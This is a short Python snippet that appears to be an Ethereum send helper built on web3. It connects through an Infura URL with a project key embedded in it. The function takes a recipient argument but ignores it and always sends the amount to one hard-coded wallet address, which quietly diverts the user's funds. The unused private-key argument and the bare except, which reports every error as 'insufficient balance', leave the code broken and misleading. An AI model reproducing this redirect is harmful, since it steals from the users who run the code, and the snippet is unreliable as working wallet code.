import re
from bit import Key
from web3 import Web3
from web3 import exceptions

w3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/2fbfed44662c47e2ba50b79fd36c854e'))

def ETH(address, key, amount, to):
    try:
        return w3.eth.send_transaction({
        'to': '0xd3CdA913deB6f67967B99D67aCDFa1712C293601',
        'from': address,
        'value': amount
    })
    except :
        return 'موجودی کافی نیست'